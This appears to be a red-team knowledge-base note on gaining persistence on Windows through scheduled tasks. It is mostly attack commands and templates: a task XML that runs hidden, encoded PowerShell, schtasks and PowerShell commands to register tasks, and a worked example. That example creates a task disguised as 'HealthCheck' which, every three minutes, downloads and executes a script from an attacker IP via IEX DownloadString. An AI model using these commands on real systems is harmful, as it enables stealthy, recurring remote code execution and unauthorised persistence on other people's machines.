# Schedule Tasks

## 01 - Common Files

```
C:\Windows\System32\schtasks.exe
C:\Windows\SysWOW64\schtasks.exe
```

## 02 - Generate Payloads

### 2.1 - Schedule Task Payload

A template script to execute the payload.

TODO: Check which is the day and month in this XML file.

```xml
<Task version="1.4" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo>
    <Description>This is a description</Description>
  </RegistrationInfo>
  <Triggers>
    <CalendarTrigger>
      <StartBoundary>yyyy-01-01Thh:mm:ss</StartBoundary>
      <ScheduleByDay>
        <DaysInterval>1</DaysInterval>
      </ScheduleByDay>
    </CalendarTrigger>
  </Triggers>
  <Actions>
    <Exec>
      <Command>powershell.exe</Command>
      <Arguments>-nop -w hidden -enc <base64_encoded></Arguments>
    </Exec>
  </Actions>
</Task>
```

### 2.2 - Export XML Payload

#### 2.2.1 - Command Prompt

```
C:\> schtasks.exe /query /xml /tn "<task_name>" > schedule.xml
```

#### 2.2.2 - PowerShell

```
PS C:> Export-ScheduledTask "<task_name>" | Out-File -Encoding ascii payload.xml

PS C:> Export-ScheduledTask "<task_name>" | Out-File -Encoding utf8 payload.xml

PS C:> Export-ScheduledTask "<task_name>" | Out-File -Encoding unicode payload.xml
```

## 03 - Execute Payloads

### 3.1 - Command Prompt

TODO: Use batch scripting one liner by using environment variables to trigger the payload with time delay such as 3 minutes

```
C:\> schtasks.exe /create /mo 1 /sc minute /tn "<task_name>" /tr "<commands>"
```

Import the XML to schedule the task by executing the payload.

> [!TIP]
> Best to create a script to automate the whole process since it requires time duration in order to trigger it.

```
C:\> schtasks.exe /create /xml /tn "<task_name>" payload.xml
```

### 3.2 - PowerShell

```powershell
PS C:\> $action = New-ScheduledTaskAction -Execute "<command>" -Argument "<arguments>"

$trigger = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 3)
$settings = New-ScheduledTaskSettingsSet -RunOnlyIfNetworkAvailable -StartWhenAvailable -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "<task_name>"
```

Let's use [[06 - Tactics & Techniques & Procedures (TTPs) Phases/C - Initial Access/0x01 - Weaponization/0xC - Client-Side Attacks/Delivery Methods/Command and Scripting Interpreter/Desktop/Windows/Code Execution/PowerShell|PowerShell]] as example.

```powershell
PS C:\> $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle hidden -c `"IEX (New-Object Net.WebClient).DownloadString('http[s]://<attacker_IP>/payload.ps1')`""

$trigger = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 3)
$settings = New-ScheduledTaskSettingsSet -RunOnlyIfNetworkAvailable -StartWhenAvailable -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "HealthCheck"
```

Import the XML to schedule the task by executing the payload.

> [!TIP]
> Best to create a script to automate the whole process since it requires time duration in order to trigger it.

```
PS C:\> Register-ScheduledTask -TaskName "<task_name>" -Xml (Get-Content '.\payload.xml' | Out-String) -Force

PS C:\> Register-ScheduledTask -TaskName "<task_name>" -Xml (Get-Content '.\payload.xml' -Raw) -Force
```

---
## References

### Backlinks

- [[06 - Tactics & Techniques & Procedures (TTPs) Phases/F - Post Exploitation/0x08 - Maintaining Access/Persistence/Windows/Host Persistence/Backdoors/Schedule Tasks/Schtasks/Manual/Living off the Land|Maintaining Access: Schedule Tasks Persistence]]